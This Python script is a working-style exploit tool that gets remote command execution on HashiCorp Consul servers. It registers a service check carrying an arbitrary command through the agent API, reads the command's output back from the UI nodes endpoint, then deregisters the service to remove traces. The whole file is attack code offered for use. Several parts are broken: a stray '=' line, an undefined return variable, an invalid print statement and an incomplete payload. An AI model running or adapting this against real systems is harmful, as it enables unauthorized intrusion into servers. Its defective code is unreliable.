#!/usr/bin/env python
#
#
# Author: random_robbie

import colorama
import sys
import os
import re
import json
import requests
from time import sleep
import base64
import argparse
from colorama import init, Fore, Back, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib3
urllib3.disable_warnings()
init(autoreset=True)


# Configuration
session = requests.Session()
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--server", required=True, help="Consule Server IP")
parser.add_argument("-c", "--command", required=True, help="RCE Command to execute")

args = parser.parse_args()

def remove_services(URL):
	
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/deregister/RCE", headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload One')
		
	response2 = session.put(""+URL+"/v1/agent/service/deregister/RCE", headers=headers, verify=False)
	if response2.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload One')
		
	
		

def grab_dc (URL):
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/catalog/datacenters", headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		dc = js[0]
		print (Fore.GREEN + "[*] Datacenter Chosen [*]")
		return dc
	else:
		print(Fore.RED + '[!] Unable to parse DC\n')
		exit();
		
		
def send_payload_one (URL,RCE):
	
	payload = '''{
  "ID": "RCE",
  "Name": "RCE",

  "args": [
    "'''+RCE+'''"
  ],
  "Interval": "15s",
  "TLSSkipVerify": true,
  "timeout": "10s",
  "DeregisterCriticalServiceAfter": "10m"
}
'''
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/register", data=payload, headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Sent [*]")
	else:
		print(Fore.RED + '[!] Payload One Failed\n')
		exit();
		
		


def parse_payload_one(URL,DC):
	paramsGet = {"dc":DC,"token":""}
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/internal/ui/nodes", params=paramsGet, headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		for p in js:
			for Serv in p['Checks']:
				
				if Serv['ServiceName'] == "RCE":
					out = Serv['Output']
					print (Fore.GREEN + "[*] RCE Results: "+out+" [*]")
					return IAM

					
					
=
	


try:
	URL = args.server
	RCE = args.command
	print (Fore.RED + "[*] By Default RCE is turned off in version 1.4.0 [*]")
	DC = grab_dc (URL)
	send_payload_one (URL,RCE)
	print (Fore.GREEN + "[*] Sleeping 10 seconds to allow time for system to parse. [*]")
	sleep (10)
	IAM = parse_payload_one(URL,DC)
	print (Fore.GREEN + "[*] "+IAM+" [*]")
	remove_services(URL)
		
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		print['data']
		pass
